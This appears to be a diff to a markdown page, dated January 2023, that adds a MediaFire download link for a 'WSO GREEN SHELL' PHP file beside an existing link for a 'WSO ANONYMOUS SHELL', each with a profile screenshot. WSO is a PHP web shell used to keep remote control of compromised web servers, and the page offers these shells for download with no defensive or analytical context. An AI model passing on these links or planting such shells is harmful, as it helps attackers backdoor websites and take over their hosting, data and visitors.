@@ -148,3 +148,5 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/zqbergch5lcn5op/wso-anon.php/file">WSO ANONYMOUS SHELL</a> 
 <img src="https://i.imgur.com/n0MzVey.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/p727casrwj5oakk/wso-green.php/file">WSO GREEN SHELL</a> 
+<img src="https://i.imgur.com/gz4pS8M.png" alt="beruangsalju profile">
